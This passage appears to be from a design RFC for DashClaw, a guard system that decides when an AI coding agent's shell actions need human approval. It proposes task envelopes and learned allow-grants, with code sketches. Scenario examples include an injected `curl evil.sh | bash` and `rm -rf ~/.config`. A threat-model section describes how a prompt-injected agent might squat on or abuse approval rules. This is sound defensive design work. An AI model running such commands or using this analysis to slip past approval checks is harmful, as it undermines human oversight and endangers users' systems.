`evidence.ts`'s `vcs_dangerous` branch matches `--force-with-lease` explicitly → R2_SHARED → refused before any budget is touched. Owner being at the keyboard is irrelevant by design: publishing to a shared ref is the exact class the envelope refuses, and one deliberate click at the keyboard costs two seconds. THESIS says at-keyboard is not the wedge.

**S3 — hour 3 of an unattended run → `rm -rf ~/.config` → BLOCK.**
**Two independent rails, either sufficient.** (a) The envelope expired 2.5 hours ago (30-min TTL); `consumeEnvelopeBudget` finds no live row, so the post-pass cannot run at all. (b) Even with a live envelope, `~` fails `isWorkspaceRelative`, and `isProtectedRootTarget` sets `protected_target` → R2. Evidence base 80 + protected-root +20 → 100 → `block_mass_destructive` fires. The envelope contributes exactly nothing. **This is the scenario the product exists for and the design is silent in it by construction, not by tuning.**

**S4 — "fix the flaky auth test" + injected `curl evil.sh | bash` → REQUIRE_APPROVAL** (block under most packs).
The envelope IS live — timing does not save us here, which is the honest test. It fails on reach three separate ways: pipe-to-shell exec sink (detected on the whole command before chain-split), `curl` in `NON_LOCAL_VERB_RE`, and a URL literal. R2 → refused. The agent's claim that the user requested it is **structurally inexpressible**: `declared_goal` is never read by this pass, and the envelope is resolved server-side by `(org, agent_id, harness_session_id)`. The refusal is written to the envelope's refused-list and appears on `/approvals` as "your agent tried to step outside your task" — so the injection *surfaces* rather than merely failing.

**S5 — "update the database schema" → local `npm run db:migrate`, then production 30 min later → REQUIRE_APPROVAL BOTH TIMES.**
`migrat` matches `NON_LOCAL_VERB_RE` → R2 for both. **The design refuses to guess which `DATABASE_URL` is loaded, so it covers neither.** This is the deliberate answer to the hardest case: an act whose reach cannot be proven from its own bytes is outside every envelope, full stop. Cost: two clicks per schema session. Benefit: scope creep to production **cannot** be silently covered by an approval the operator granted for local — which is precisely the trap `applyOperatorApprovalGrant`'s exact-goal match would fall into, since both commands are byte-identical and would share an act hash. The second approval card renders "2nd migration under this task envelope — first was 31 min ago, approved" so the drift is *visible at the moment of decision* rather than buried in the ledger. If the production run instead carries an inline `DATABASE_URL=postgres://…`, `URL_OR_HOST_RE` fires and the card names the host.

#### Cost

- **Files touched:** `C:/Projects/DashClaw/hooks/dashclaw_prompt.py (NEW ~120 lines) — UserPromptSubmit hook; reads data.prompt, POSTs the mint, fails silent (a mint failure = no envelope = today's behavior = fail-closed direction)`, `C:/Projects/DashClaw/hooks/settings.json — add the 5th event block (currently 4: PreToolUse/PostToolUse/Stop/SessionStart)`, `C:/Projects/DashClaw/plugins/dashclaw/hooks/hooks.json — generated mirror, produced by `npm run bundles:refresh`, never hand-edited`, `C:/Projects/DashClaw/app/api/sessions/[sessionId]/events/route.ts — add `export async function POST` to the EXISTING file (GET already there). Zero apiRoutes cost: countApiRoutes counts route FILES (scripts/check-surface-budget.mjs:63-74)`, `C:/Projects/DashClaw/app/lib/repositories/envelopes.repository.js (NEW) — mintEnvelope/supersede/consumeEnvelopeBudget/recordEnvelopeRefusal/revoke/extend. ALL SQL lives here (CLAUDE.md: no direct SQL in route files; repositories are exempt from route-sql:check)`, `C:/Projects/DashClaw/app/lib/guard/reach.ts (NEW ~150 lines) — computeReach(), pure and synchronous over context.act + classifyAct() flags`, `C:/Projects/DashClaw/app/lib/guard/evaluate.ts — applyTaskEnvelopeGrant post-pass + one inserted call line between :1060 and :1074`, `C:/Projects/DashClaw/app/lib/guard/types.ts — EnvelopeGrantInfo type only. NO new GuardEvalContext field (harness_session_id already arrives via app/api/guard/route.ts:334 and the index signature, proven by containment.ts:115)`, `C:/Projects/DashClaw/app/lib/validate.js — NO CHANGE. Nothing new comes from the client. GUARD_INPUT_SCHEMA (:292-344) is untouched, which is itself a feature`, `C:/Projects/DashClaw/app/lib/guard/risk.ts — NO CHANGE. The D1 max() fold is not edited`, `C:/Projects/DashClaw/app/lib/guard/policy.ts — NO CHANGE. No new policy type`, `C:/Projects/DashClaw/drizzle/00XX_task_envelopes.sql + C:/Projects/DashClaw/schema/schema.js — one table (tables are not a budgeted surface)`, `C:/Projects/DashClaw/app/approvals/_components/LiveEnvelopeStrip.tsx (NEW component, not a page)`, `C:/Projects/DashClaw/app/approvals/page.tsx — render LiveEnvelopeStrip beside the existing LivePlansSection (imported at :29-30, rendered :356/:367)`, `C:/Projects/DashClaw/app/api/approvals/[actionId]/route.ts — optional `extend_envelope` on the EXISTING approve handler, under the SAME admin + non-null-principal + anti-self-approval gates (:44-57, :102-116)`, `C:/Projects/DashClaw/app/setup/page.jsx — one readiness line: 'Prompt hook detected: yes/no' (installed hooks are COPIES; needs install-hooks --global + session restart)`, `C:/Projects/DashClaw/__tests__/fixtures/envelope-reach-vectors.json (NEW) + __tests__/unit/guard/reach.test.js — pins all 8 known false-positive incidents from risk-calibration-golden-vectors.json plus S1-S5`, `C:/Projects/DashClaw/__tests__/unit/guard/task-envelope-grant.test.js (NEW) — block-never-touched, ungrantable-respected, containment_promote-excluded, budget exhaustion, TTL expiry, atomic double-consume`, `C:/Projects/DashClaw/docs/rfcs/2026-08-11-task-envelope-authorization.md (NEW)`, `C:/Projects/DashClaw/docs/architecture/trust-and-failure-model.md — D-rule addendum: why a decision-layer downgrade keyed on server-computed reach does not weaken D1`, `C:/Projects/DashClaw/THESIS.md — one paragraph: calibrated interruption now means reach-bounded, presence-gated silence (no ceiling change needed)`, `C:/Projects/DashClaw/plugins/dashclaw/PLUGIN_PARITY.md — record the explicit parity delta: Codex and Claude Desktop never mint an envelope; Hermes pre_llm_call is the v2 path`, `C:/Projects/DashClaw/docs/maintainer-log.md + CHANGELOG.md`
- **Surface budget:** **Zero against every one of the eight ceilings. No THESIS.md amendment required.**

- `apiRoutes` **131 → 131 (+0).** The mint adds `POST` to the already-existing `app/api/sessions/[sessionId]/events/route.ts`. `countApiRoutes()` (`scripts/check-surface-budget.mjs:63-74`) increments once per route **file** that exports ≥1 HTTP method, and `discoverApiRoutes()` (`scripts/lib/api-route-inventory.mjs`) pushes one entry per file with a `methods` array. Adding a method to a file already counted changes nothing. The envelope extension rides the existing `POST /api/approvals/[actionId]`.
- `appPages` **53 → 53 (+0).** `LiveEnvelopeStrip.tsx` is a component under `app/approvals/_components/`, not a `page.tsx`. `countAppPages` matches `/^page\.(js|jsx|ts|tsx)$/` only.
- `guardPolicyTypes` **16 → 16 (+0).** This is the answer I care most about. The envelope is a **post-pass**, not a policy — it joins `builtin:operator_approval` and `builtin:plan_grant` as a `matchedPolicies` sentinel string. `POLICY_EVALUATORS` (`policy.ts:259-470`) gains no key, so `KNOWN_POLICY_TYPES` (`policy.ts:484`) is unchanged and `countGuardPolicyTypes()` reads the same number.
- `mcpTools` 17 → 17, `mcpResources` 3 → 3, `sdkNodeMethods` 39 → 39, `sdkPythonMethods` 59 → 59, `cliCommands` 14 → 14. **All +0.** The agent needs no new tool, method, or command — it cannot participate in envelope authorization at all, which is the security property, not an omission.

**Unbudgeted additions, named for honesty:** one DB table (`task_envelopes`), one hook event registration (4 → 5), one new guard module (`reach.ts`), one new repository, one new React component. None of these are on the surface-budget list; I list them so the count is not read as "nothing was added."
- **Human surface:** **Page: `/approvals` — the repo's own designated hero surface. Click path: top nav → Approvals. No new page, no deep link, no terminal.**

At the top of the section that already renders `LivePlansSection` (imported `app/approvals/page.tsx:29-30`, rendered `:356`/`:367`), a sibling **`LiveEnvelopeStrip`**:

> **Working on:** *"clean out the build artifacts"* · started 8 min ago · **22 min left** · **14 / 40 actions covered** · scope: **this folder only**
> `[ Revoke now ]`  `[ 3 blocked — review ▾ ]`

- **`Revoke now`** — one click, `status='revoked'`, every subsequent action interrupts again immediately. This is the panic button, and it is a button.
- **`3 blocked — review ▾`** — expands the refused-act list written by `recordEnvelopeRefusal`: what the agent tried, the reach class, and the human-readable basis ("command names a remote host: `db.prod.neon.tech`"). Each row carries **`Allow for this task`**, which POSTs `extend_envelope` through the **existing** `POST /api/approvals/[actionId]` handler under its existing admin-role + non-null-principal + anti-self-approval gates. The extension is scoped to that exact resource fingerprint (that host, that remote ref, that path) for the envelope's remaining TTL and budget — never "R2 in general."

That refused-list is the direct answer to "what happens when the agent legitimately needs to step outside mid-task," and it satisfies MAINTAINER.md's rule that enforcement loosening is a proposal a human ratifies with one click, never auto-applied.

**Discoverability from where humans already are:** every envelope-covered decision writes `builtin:task_envelope` plus the prompt excerpt into `guard_decisions`, so `/decisions` renders "covered by your instruction *'clean out the build artifacts'*" on the causal chain — the owner can see what his sentence bought without visiting anything new. `/setup` gains one readiness line: **"Prompt hook detected: yes / no"**, because installed hooks are copies and a missing restart would otherwise present as "the feature silently does nothing."

**Zero-terminal test:** revoke = click. Widen = click. See what was covered = read. Verify install = read a status line. Terminal commands in the human's role: **zero**. The only terminal step is `dashclaw install-hooks --global`, which is a dev/install act, explicitly exempt.

**Rendered proof required before ship:** drive `/approvals` with a live envelope and a refused act via the frontend-verify skill, confirm the strip renders with real data, `Revoke` kills the envelope, and the next guarded action interrupts.
- **Why it beats the obvious:** **Lowering the threshold loosens the 3am unattended run exactly as much as the 2pm attended one.** That is the single most important sentence here. A threshold is a global constant; it has no idea whether a human just spoke. This design loosens along two axes simultaneously — *a human directed this within 30 minutes* AND *the effects cannot leave the working tree* — and it snaps shut on its own when either fails. S3 is the proof: under a lowered threshold, `rm -rf ~/.config` at hour three gets *closer* to allowed. Under an envelope it is refused by two independent rails, and the design gets *stricter* the longer the human is away, which is the exact shape THESIS asks for.

**Turning policies off is not hypothetical here — it already happened.** THESIS records the product's only real usage event: the reference deployment ran with all policies off for 18 days because the default pack fired an approval every ten seconds. Falsifier #1 is >50% of installers disabling enforcement in week one. Every policy stays on under this design, every decision stays recorded, and the audit trail actually gets *richer* (each covered action carries the human sentence that authorized it). What changes is only whether the owner is *interrupted*, and only for R0.

**Recon proved the threshold is not even the lever.** Both shipped packs that produce approvals gate on `action_type` **membership**, not on the score: `claude-code-starter/policies.yml:39-54` keys on `[api]`, `:63-78` keys on `[build]`. Turning the number down would not have fixed S1. And the pack's only score-keyed rule is a hard `block` at exactly 100 — a number you cannot lower without deleting the catastrophe rail entirely.

**Every shipped relief mechanism is retrospective; the complaint is about the first occurrence.** `policy-tuning/engine.ts:82-98` needs ≥10 fired interruptions and ≥5 resolved outcomes at ≥90% override before it proposes anything; `posture/loosening.ts:19-27` sets a stricter 95% bar; `allow_grant` requires the human to hand-author a grant *before* the shape has ever occurred once; `applyOperatorApprovalGrant` covers only a byte-identical retry within 15 minutes. The owner's complaint is "I am approving the thing I just asked for" — a first occurrence, every time. The envelope is the only mechanism that works on the first occurrence, because the authorizing event (his sentence) happened *before* the action, not after ten of them.

**And it is not a fourth calibration engine.** Recon found two systems already named "calibration," a tuning engine, a loosening engine, and a dormant threshold controller — five overlapping retrospective mechanisms, most off by default with no UI. Adding a sixth number to tune would be exactly the regrowth the surface budget exists to stop. This adds **zero budgeted surfaces, zero policy types, zero client-trusted fields**, and deletes the guessing entirely: there is no envelope to infer, no plan card to review, no threshold to pick. There is a sentence you typed, a folder you are working in, and a clock.

#### Failure modes

- Hook installed but session not restarted. Installed hooks are COPIES (`hooks/` -> `.claude/hooks/`); the owner runs install-hooks --global, sees no change, and concludes the feature is broken. Mitigation: the /setup readiness line, and the /approvals strip renders an explicit 'No task envelope - prompt hook not detected in this session' empty state rather than rendering nothing.
- harness_session_id missing. It is attached only when _SESSION_ID is present (pretool.py:1715-1726) and is NOT in GUARD_INPUT_SCHEMA - it is re-extracted post-validation at guard/route.ts:334. If it is absent the envelope never matches and coverage silently drops to zero. Fails in the safe direction (more interrupts) but is invisible. Mitigation: the guard response already returns matchedPolicies; the /approvals strip shows 'envelope live but 0 actions matched' when mint succeeded and consumption never fires - a visible, diagnosable state.
- Codex and Claude Desktop get nothing. Codex's installer writes exactly four hook blocks (cli/lib/codex/install.js:219-280) and has no UserPromptSubmit equivalent; Claude Desktop cannot run local hooks at all (PLUGIN_PARITY.md:79-82). Those runtimes keep today's behavior exactly. Must be a RECORDED parity delta, not a silent gap. Hermes CAN do it via pre_llm_call (.hermes/hooks/dashclaw_pre_llm_hermes.py:80-103 already receives the turn but reads only session_id) - explicitly deferred to v2.
- Subagent agent_id mismatch. A composed subagent's agent_id is `parent:child`; a naive equality match would deny it the parent's envelope, and coverage would collapse exactly in the fleet case. v1 matches `agent_id = minting_agent OR agent_id LIKE minting_agent || ':%'`. delegation_constraint (policy.ts:381) still applies tighten-only on top, so a subagent cannot use the envelope to exceed its delegated authority.
- Prompt text can contain secrets. The human types an API key while debugging; it lands in prompt_excerpt and then on a rendered page. MUST store only sha256(full prompt) plus a redactAny()-scrubbed 400-char excerpt (redactAny is already imported by app/api/plans/route.ts:19). A miss here violates the repo's own secret-handling rule and puts a credential on a dashboard.
- Reach classifier false positives (FN-6). A shell form that escapes both NON_LOCAL_VERB_RE and URL_OR_HOST_RE grades R0 wrongly. Same adversarial surface bash_classifier.py and evidence.ts already carry, so it inherits their hardening - but it is genuinely regex-shaped and will need vector maintenance. Mitigated by __tests__/fixtures/envelope-reach-vectors.json as a standing regression corpus, not by claiming completeness.
- Reach classifier false negatives. Interrupts persist where they should not, and the owner concludes nothing improved. This one SELF-REPORTS: every refusal is written and rendered in the /approvals 'blocked - review' list with its basis string, so under-coverage is visible and one click wide rather than an invisible disappointment.
- Envelope burnt on an action that ends up blocked. applyBlockOverride for replay/act-binding (:1187-1188) and finalizeContainment run after this pass and can still raise, consuming a budget unit for a blocked action. Identical to the accepted exposure already documented for plan grants at evaluate.ts:~1066. Cost is 1 of 40, not a human click. Accepted, not fixed.
- Table growth. Every prompt mints a row. At heavy use that is thousands per week. Needs a bound + reaper like the signal_snapshots lesson: status is computed by predicate (expires_at > NOW()) so correctness never depends on the reaper, but rows older than 7 days must be deleted by the existing app/api/cron job or the table walls.
- The 30-minute TTL is a guess. Too short and long focused sessions re-interrupt mid-task; too long and it starts covering unattended drift. It is an org setting with a hard 120-minute clamp (same clamp pattern as DEFAULT_TTL_CLAMP in app/api/plans/route.ts:31), and the right value should be tuned from the envelope's own covered/refused counters after real use - not asserted now.

---

### Precedent — learned allow-grants mined from adjudicated approvals

> After you personally wave the same narrowly-defined kind of safe command through five times across two different days, DashClaw offers you one button that stops asking about that exact kind — and it is structurally incapable of ever learning to stop asking about the dangerous kinds.

#### Core mechanism

Three parts: fix the label, keep the coordinate, close the loop.

**Why v4.74.0's calibration controller failed — three independent reasons, all fatal.** (1) It is off by default and unreachable: `parseCalibrationSettings` defaults mode to `'off'` (calibration.ts:120), zero migrations or seeds set `CALIBRATION_CONTROLLER_MODE`, and no page renders a toggle — the only activation is a raw PATCH with an internal key name. (2) Even fully active it is structurally tighten-only: `runCalibrationController` (evaluate.ts:622-651) contains exactly one mutation, `raiseDecision(acc,'require_approval')`, and its own docblock (calibration.ts:20-25) says so. **It is a loop that measures over-interruption and is forbidden from acting on it.** (3) θ is the wrong variable — it is a threshold on the risk *score*, but every require_approval that actually ships is *categorical*: `hold_secret_file_writes` is a path glob that fired at 95 not 100 (policies.yml:42-69), and claude-code-starter's two interrupt rules key on `action_types:[api]`/`[build]` (policies.yml:39-54,63-78). Moving θ does nothing to a policy that never reads θ. Off, backwards, and aimed at a dial the friction isn't attached to.

**Part 1 — the label is wrong before any loop can learn.** `isRegenerableArtifactTarget` (evidence.ts:107-112) tests membership in a bare-name set (evidence.ts:57-60). So S1's `./dist` passes but `./node_modules/.cache` fails, `.every()` fails, and the whole command grades `['destructive']` base 80 → 100. **Deleting a subtree of `node_modules` scores higher than deleting all of `node_modules`, which is allowlisted.** A monotonicity bug, and the direct cause of THE COMPLAINT. Fix: a proper relative subtree of a regenerable dir is regenerable (globs, absolute paths, `..` still disqualify).

**Part 2 — keep the coordinate that already exists.** `classifyAct` already computes `flags: string[]` server-side from the act bytes (evidence.ts:28-34) — `regenerable_artifact`, `protected_target`, `vcs_dangerous`, `remote_exec`, `privilege`, `deploy`, `secret_exposure`. `foldEvidenceIntoContext` computes them and **throws them away** (evaluate.ts:841-885; `EvidenceDerivedBreakdown`, risk.ts:102-113, has no flags field). Keep them. They ride into `guard_decisions.context._risk_breakdown` via the additive-jsonb pattern the code itself endorses (evaluate.ts:741-743: "no schema migration, queryable via jsonb"). **Zero migrations.**

**Part 3 — close the loop.** `approved_by` is already stamped only by the admin-gated approvals route (approvals/[actionId]/route.ts:44-46,102-116). `getInterruptOutcomesByPolicyAction` (loosening.repository.ts:61-104) already mines exactly this join. Add one rule to that existing engine that groups by flag-set instead of by policy, gate it on a closed allowlist, and propose the result into the existing TriageInbox queue. Ratify writes an ordinary `allow_grant` row with a new `precedent_flags` field. No new policy type, no new post-pass, no new route, no new page.

#### Decision function

```ts
// ════════════════════════════════════════════════════════════════════════════
// STEP 1 — LABEL CORRECTNESS.  app/lib/guard/evidence.ts:107
// A loop that learns from a wrong label produces a wrong rule. Today
// `rm -rf ./dist ./node_modules/.cache` grades ['destructive'] base 80 (→100
// after +15 irreversible +20 goal) because the allowlist is BARE NAMES ONLY
// (evidence.ts:57-60). Deleting node_modules/.cache therefore scores HIGHER
// than deleting all of node_modules, which is allowlisted. Monotonicity bug.
function isRegenerableArtifactTarget(target: string): boolean {
  if (/[*?[]/.test(target)) return false;                    // unchanged
  let t = target.replace(/\\/g, '/').replace(/\/+$/, '');
  if (t.startsWith('./')) t = t.slice(2);
  if (t.startsWith('/') || t.split('/').includes('..')) return false; // unchanged intent
  if (REGENERABLE_ARTIFACT_DIRS.has(t.toLowerCase())) return true;    // unchanged
  // NEW: a proper relative subtree of a regenerable dir is regenerable.
  // If deleting ALL of `node_modules` is routine, deleting `node_modules/.cache`
  // cannot be more dangerous. Strictly narrows nothing; only de-escalates.
  const head = t.split('/')[0].toLowerCase();
  return t.includes('/') && REGENERABLE_ARTIFACT_DIRS.has(head);
}
// ⇒ S1 now grades cleanup / base 45 / flags ['destructive','regenerable_artifact'].

// ════════════════════════════════════════════════════════════════════════════
// STEP 2 — THE COORDINATE.  app/lib/guard/evaluate.ts:841 foldEvidenceIntoContext
function foldEvidenceIntoContext(context: GuardEvalContext): EvidenceDerivedBreakdown | null {
  const evidence = classifyAct(context.act);
  if (!evidence) return null;
  /* ...existing mismatch / action_type swap / target / write_paths logic UNCHANGED... */

  // TRUST-CRITICAL (rule D1). `evidence_flags` is deliberately NOT added to
  // GUARD_INPUT_SCHEMA (validate.js:292-344). That schema is a strict
  // whitelist — validate() silently strips every field not listed (verified:
  // the key is absent from the literal). So this property can ONLY ever hold
  // what classifyAct() just derived, server-side, from context.act. A caller
  // POSTing {"evidence_flags":["regenerable_artifact"]} has it removed before
  // evaluateGuard() is ever entered. The whitelist that normally blocks new
  // fields is exactly what makes this field unforgeable.
  context.evidence_flags = evidence.flags;
  return { ...existing, flags: evidence.flags };   // + flags on risk.ts:102
}

// ════════════════════════════════════════════════════════════════════════════
// STEP 3 — ELIGIBILITY.  app/lib/policy-shapes.ts   ← THE SAFETY CORE
// A closed ALLOWLIST, not a denylist. Every shape not enumerated is unlearnable
// forever, at any approval count. Every future evidence.ts flag is non-learnable
// by default. Fail-closed by construction.
//
// ADMISSION RULE (the Precedent Safety Invariant): a shape is listed only if its
// worst case, over ALL inputs the classifier grades into it, is recoverable by
// re-running a build command. The list is constitutional, not operator-editable.
const PRECEDENT_ELIGIBLE = new Set([
  'cleanup|destructive,regenerable_artifact', // rm -rf ./dist|.next|node_modules/**
  'build|package',                            // npm/pip/cargo/brew install
  'review|',                                  // cat ls grep git status/log/diff (base 5)
]);
// NOT listed, deliberately:
//   'security|destructive'  → bare destructive is `rm -rf ~/.config`, `rm -rf ./src`
//                             (isProtectedRootTarget is roots-only, evidence.ts:118-130)
//   'other|'                → the unclassified default bucket (evidence.ts:259-261).
//                             Listing it would grant everything the parser can't read. S5.
//   'apply|'                → catches chmod/chown/sed -i with no root check. Too wide.

// Redundant second gate. Rejects the shape even if a key somehow matched.
const NEVER_PRECEDENTED = new Set([
  'protected_target','device_write','interpreter_destructive','remote_exec',
  'secret_exposure','sensitive_path','privilege','deploy','vcs_dangerous',
]);

export function precedentKey(actionType: string, flags: string[]): string {
  return `${actionType}|${[...flags].sort().join(',')}`;
}
export function precedentEligible(actionType: string, flags: string[]): boolean {
  if (flags.some((f) => NEVER_PRECEDENTED.has(f))) return false;
  return PRECEDENT_ELIGIBLE.has(precedentKey(actionType, flags));
}

// ════════════════════════════════════════════════════════════════════════════
// STEP 4 — MATCHING.  app/lib/policy-shapes.ts:123 grantMatches (EXTENDED)
// Precedents ARE allow_grant rows. No new policy type. No new post-pass.
export function grantMatches(rules: GrantRules, context: GrantContext): boolean {
  // (unchanged :132-138) reclassification firewall — a swapped action_type
  // fails every permissive grant closed.
  if (context.declared_action_type && context.declared_action_type !== context.action_type) return false;
  // (unchanged :139-141) action_type equality
  if (typeof rules.action_type !== 'string' || rules.action_type !== context.action_type) return false;

  // NEW — precedent binding. Field ABSENT ⇒ byte-identical to today's behavior,
  // so every operator-authored grant is unaffected. Field PRESENT ⇒ strictly
  // TIGHTENS the match by adding a required condition. Never loosens one.
  if (Array.isArray(rules.precedent_flags)) {
    const ctx = context.evidence_flags;
    if (!Array.isArray(ctx)) return false;      // no act ⇒ no flags ⇒ NO coverage (fail closed)
    const want = rules.precedent_flags as string[];
    // EXACT SET EQUALITY, never subset. A superset carries a risk signal the
    // human never adjudicated: ['destructive','regenerable_artifact'] must not
    // cover ['destructive','regenerable_artifact','privilege'].
    if (ctx.length !== want.length) return false;
    const have = new Set(ctx as string[]);
    if (!want.every((f) => have.has(f))) return false;
    // Re-check eligibility AT MATCH TIME, so a precedent ratified before an
    // allowlist change goes inert on upgrade instead of being grandfathered.
    if (!precedentEligible(String(rules.action_type), want)) return false;
  }

  if (rules.target_prefix == null) return true;
  return targetPrefixMatches(String(rules.target_prefix), context);
}

// ════════════════════════════════════════════════════════════════════════════
// STEP 5 — COMPOSITION.  app/lib/guard/evaluate.ts:1051 applyAllowGrants — UNCHANGED.
// Precedent adds ZERO new code to the decision path. It rides the existing
// post-pass, which already encodes every constitutional guard.
//
//  evaluate.ts:988  computeRiskAssessment    max(server,template,client,evidence)
//                                            UNTOUCHED — precedent never changes a NUMBER.
//  evaluate.ts:1021 runLocalPolicies         raise-only
//  evaluate.ts:1022 scanPromptInjection      raise-only
//  evaluate.ts:1029 containment_promote      raise-only (unconditional)
//  evaluate.ts:1040 runWebhookPolicies       raise-only
//  evaluate.ts:1044 runCalibrationController raise-only (tighten-only by charter)
//  evaluate.ts:1051 applyAllowGrants  ←──── PRECEDENT ACTS HERE, AND ONLY HERE
//  evaluate.ts:1060 applyOperatorApprovalGrant   (untouched)
//  evaluate.ts:1074 applyPlanStepGrant           (untouched)
//  evaluate.ts:1187 applyBlockOverride ×2        (raise-only, runs AFTER — a replay
//                                                 or act-binding violation still blocks
//                                                 a precedent-downgraded decision)
function applyAllowGrants(policies, context, acc): void {        // existing body, verbatim
  if (context.action_type === 'containment_promote') return;     // :306  containment merges survive
  if (acc.highestDecision !== 'warn'
   && acc.highestDecision !== 'require_approval') return;        // :307  BLOCK survives. ABSOLUTE.
                                                                 //       allow_contained survives.
  const ungrantable = acc.gatingPolicies.find((g) => g.ungrantable);
  if (ungrantable) { acc.warnings.push(`${ungrantable.name}: ungrantable`); return; } // :312-316
  for (const policy of policies) {
    if (policy.policy_type !== 'allow_grant') continue;          // :318
    if (grantIsExpired(rules, policy.created_at)) continue;      // :330  14-day TTL enforced HERE
    if (grantMatches(rules, context)) {                          // :331  precedent predicate above
      acc.warnings.push(`${policy.name}: precedent downgraded ${acc.highestDecision} to allow`);
      acc.matchedPolicies.push(policy.id);
      acc.highestDecision = 'allow';                             // :334  ←── THE ONLY allow EXIT
      return;
    }
  }
}
//
// VERDICT MAP:
//   block            → UNREACHABLE by precedent (guard :307). Absolute, per MAINTAINER.md.
//   allow_contained  → UNREACHABLE by precedent (guard :307).
//   require_approval → downgrades to allow at :334 ONLY when ALL hold: shape on the
//                      closed allowlist ∧ a human ratified it ∧ grant unexpired (≤14d)
//                      ∧ no gating policy ungrantable ∧ exact flag-set equality
//                      ∧ action_type equality ∧ no reclassification ∧ target prefix match.
//   warn             → same single path.
//   allow            → unchanged.

// ════════════════════════════════════════════════════════════════════════════
// STEP 6 — THE LOOP.  app/lib/posture/loosening.ts (new rule in the EXISTING engine)
export const PRECEDENT_RULE = 'grant_precedent';
export const PRECEDENT_DEFAULTS = {
  minApprovals: 5,       // vs loosening's minFired 10 — this grain is far narrower
  maxDenials: 0,         // ZERO. 5 approvals to earn; 1 deny to lose FOREVER.
  minDistinctDays: 2,    // one compromised session cannot mint a rule
  ttlDays: 14,           // half GRANT_DEFAULT_TTL_DAYS (policy-shapes.ts:65)
  maxUses: 50,           // swept at read time; TTL is the hard bound
} as const;

export function derivePrecedentProposals(rows: PrecedentOutcomeRow[], now: Date) {
  return rows.flatMap((r) => {
    const flags = [...r.flags].sort();
    if (!precedentEligible(r.action_type, flags)) return [];        // gate 1: closed allowlist
    if (r.denied > 0 || r.blocked > 0) return [];                   // gate 2: deny-kill / ever-blocked
    if (r.approved < PRECEDENT_DEFAULTS.minApprovals) return [];    // gate 3: volume
    if (r.distinct_days < PRECEDENT_DEFAULTS.minDistinctDays) return []; // gate 4: spread
    return [{
      id: looseningProposalId(PRECEDENT_RULE, r.action_type, flags.join(',')), // content-stable lp_
      rule: PRECEDENT_RULE,
      title: `Stop asking about: ${humanLabel(r.action_type, flags)}`,
      evidence: { approved: r.approved, denied: 0, distinct_days: r.distinct_days,
                  example_decision_ids: r.example_decision_ids },
      // DISPLAY ONLY. On ratify the server rebuilds rules from its OWN mined
      // evidence and never from the client body — the rule loosening.ts:84-85
      // already states for every proposal in this engine.
      patch: { policy_type: 'allow_grant', rules: {
        action_type: r.action_type,
        precedent_flags: flags,
        target_prefix: r.target_prefix,
        expires_at: addDays(now, PRECEDENT_DEFAULTS.ttlDays).toISOString(),
        max_uses: PRECEDENT_DEFAULTS.maxUses,
      } },
    }];
  });
}

// Mining query — mirrors getInterruptOutcomesByPolicyAction (loosening.repository.ts:61-104),
// including its ::timestamptz cast (created_at is TEXT on fresh drizzle schemas).
// Reads the flags I now persist. No migration.
//   SELECT gd.action_type,
//          gd.context::jsonb #>> '{_risk_breakdown,evidence_derived,flags}' AS flags_json,
//          COUNT(*) FILTER (WHERE ar.approved_by IS NOT NULL)::int          AS approved,
//          COUNT(*) FILTER (WHERE ar.approved_by IS NULL
//                             AND ar.reasoning LIKE '%[HITL Decision: DENY%')::int AS denied,
//          COUNT(DISTINCT gd.created_at::timestamptz::date)::int            AS distinct_days,
//          (array_agg(gd.id ORDER BY gd.created_at DESC))[1:5]              AS example_decision_ids
//   FROM guard_decisions gd
//   LEFT JOIN action_records ar ON ar.guard_decision_id = gd.id AND ar.org_id = $1
//   WHERE gd.org_id = $1 AND gd.decision = 'require_approval'
//     AND gd.created_at::timestamptz > NOW() - make_interval(days => $2::int)
//     AND ${NOT_DEGRADED} AND ${syntheticExclusionSql(...)}
//     AND gd.context::jsonb #> '{_risk_breakdown,evidence_derived,flags}' IS NOT NULL
//   GROUP BY 1, 2
```

#### Trust argument (vs rule D1 / prompt injection)

**Rule D1 says client-supplied signals may only RAISE risk. My design never touches risk at all** — `computeRiskAssessment` (risk.ts:166-213) and its `Math.max` fold at :193-198 are untouched. Precedent is a *decision* downgrade in the post-pass phase, after every raising phase has run, exactly where `applyAllowGrants`/`applyOperatorApprovalGrant`/`applyPlanStepGrant` already live. The max() lattice is not weakened; a separate, narrower conditional is applied to its output.

**The signal is not client-authored, and this is mechanically verifiable, not asserted.** `evidence_flags` is set only at evaluate.ts:841 from `classifyAct(context.act)`. It is deliberately absent from `GUARD_INPUT_SCHEMA` (validate.js:292-344) — I read the literal; the key is not there. That schema is a strict whitelist whose own comment states unlisted fields are stripped. So a request body containing `evidence_flags` has it deleted before `evaluateGuard` is entered. **The anti-sprawl whitelist is the enforcement mechanism.** A regression test asserting `validate()` strips a hostile `evidence_flags` pins this permanently.

**What an attacker with full control of the agent's output CAN do.** Choose the command text; choose `declared_goal`, `risk_score`, `action_type`, `systems_touched`, `reversible`; retry; run inside an approved session.

**What that attacker CANNOT do.** Forge a flag. Flags are derived by `classifyShellSegment` (evidence.ts:238-331) from `context.act.command` — the bytes that will actually execute. To obtain `regenerable_artifact` the agent must submit a command the server's own parser reads as a bounded delete of a regenerable dir; if it submits that, **that is what runs**. There is no gap between the classified string and the executed string — that is precisely what act-binding already enforces (`computeActContentHash`, evaluate.ts:386; the act-binding block reason at evaluate.ts:912, applied at :1188 *after* my downgrade, so a binding violation still blocks). Declaring `action_type: cleanup` while running `rm -rf ~` yields flags `['destructive']` from the parse — a shape that is not on the allowlist — and the declared/derived mismatch additionally sets `declared_action_type`, which fails `grantMatches` closed at policy-shapes.ts:132-138.

**So the residual attack is not forgery — it is shape-squatting**, and I bound it four ways.

*A. Earn a precedent on a benign shape, then abuse it.* The shape IS the flag set, matched by **exact set equality**. Any extra risk signal produces a different set and no match. A same-set command is by construction the same risk class — a different regenerable build dir. Ceiling: the owner runs `npm install` again.

*B. A prompt-injected agent hammers an eligible shape overnight.* Bounded by `max_uses` 50 and the 14-day TTL. 50 deletions of regenerable build dirs is annoying, not catastrophic — that is the Precedent Safety Invariant doing its job.

*C. Socially engineer 5 approvals across 2 days.* The residual. But the allowlist means the poisoned shape still cannot be deploy, secret, privilege, vcs, remote-exec, or protected-target. And an attacker who can drive five human approvals across two days already has a cheaper attack: ask once and get approved. **My design does not create that capability; it makes an existing one marginally cheaper on the three narrowest classes.**

*D. Poison the loop by getting a deny recorded on a shape the owner needs.* Denial-of-service on the loop, not escalation. It re-adds interruptions. Fail-safe direction.

